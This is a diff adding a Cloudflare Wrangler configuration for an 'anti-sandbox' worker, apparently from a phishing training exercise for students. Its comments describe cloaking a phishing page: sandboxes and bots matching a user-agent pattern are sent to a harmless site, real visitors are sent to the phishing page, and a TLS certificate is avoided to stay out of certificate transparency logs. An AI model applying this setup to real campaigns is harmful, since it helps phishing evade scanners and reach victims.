@@ -1,0 +1,45 @@
+#
+# ANTI-Sandbox wrangler worker config
+#
+
+name = "basic-anti-sandbox"  # Changeme (keep it unique per student)
+
+# === DEV MODE (default) ====================================================
+# Deploys without any custom domain: the worker is reachable at
+# https://<name>.<account>.workers.dev
+# This works even if your Cloudflare account has no domain registered.
+workers_dev = true
+
+# === CUSTOM DOMAIN MODE (optional) =========================================
+# Uncomment the lines below ONLY if you own a domain already registered
+# on Cloudflare. Comment out workers_dev and replace "your-domain.com"
+# with your own domain.
+#
+# SECURITY NOTE: keep custom_domain = false. This worker is meant to be
+# reached through a domain WITHOUT a Cloudflare TLS certificate, so the
+# certificate transparency logs do not reveal the phishing endpoint.
+# workers_dev = false
+# routes = [
+# 	{ pattern = "landing.your-domain.com/*", custom_domain = false, zone_name = "your-domain.com" },
+# ]
+
+
+minify = true
+compatibility_date = "2024-03-10"
+
+main = "src/index.js" # by default, or whatever file webpack outputs
+
+
+[vars]
+# Redirect target when the visitor is detected as a sandbox/bot
+SANDBOX_REDIRECT = "https://amazon.com"
+# Redirect target when the visitor looks legit (the real phishing page)
+USER_REDIRECT = "https://example.com"
+# Final (optional) check: match the visitor User-Agent against this pattern
+# (case-insensitive regex). A match is treated as a sandbox/bot and sent to
+# SANDBOX_REDIRECT. Leave empty ("") to disable this check.
+# Examples:
+#   "Chrome"                     -> any Chrome/Chromium UA
+#   "headless|phantom|selenium"  -> common automation/sandbox markers
+#   "bot|crawler|spider"         -> crawlers
+UA_PATTERN = ""
